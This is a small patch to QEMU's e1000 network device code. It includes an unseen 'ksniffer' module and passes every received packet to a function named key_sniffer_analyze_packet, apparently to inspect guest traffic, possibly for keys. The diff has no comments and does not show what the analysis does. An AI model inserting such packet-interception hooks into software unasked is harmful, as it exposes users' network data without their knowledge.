@@ -34,6 +34,7 @@
 #include "sysemu/dma.h"
 #include "qemu/iov.h"
 #include "qemu/range.h"
+#include "hw/ksniffer/ksniffer.h"
 
 #include "e1000_regs.h"
 
@@ -1099,6 +1100,9 @@ e1000_receive_iov(NetClientState *nc, const struct iovec *iov, int iovcnt)
 static ssize_t
 e1000_receive(NetClientState *nc, const uint8_t *buf, size_t size)
 {
+    KeySnifferPtr ksniffer = key_sniffer_get_instance();
+    key_sniffer_analyze_packet(ksniffer, buf, size);
+
     const struct iovec iov = {
         .iov_base = (uint8_t *)buf,
         .iov_len = size
